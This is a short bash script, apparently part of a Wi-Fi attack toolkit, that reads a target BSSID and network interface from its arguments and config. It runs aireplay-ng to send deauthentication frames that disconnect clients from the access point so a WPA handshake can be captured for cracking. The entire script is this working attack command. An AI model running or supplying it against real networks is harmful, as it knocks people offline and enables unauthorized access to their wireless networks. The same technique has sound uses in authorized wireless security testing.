#!/bin/bash

source ../config/config.sh

BSSID="$1"

# Deauthenticate clients to capture handshake
sudo aireplay-ng --deauth 10 -a $BSSID $INTERFACE
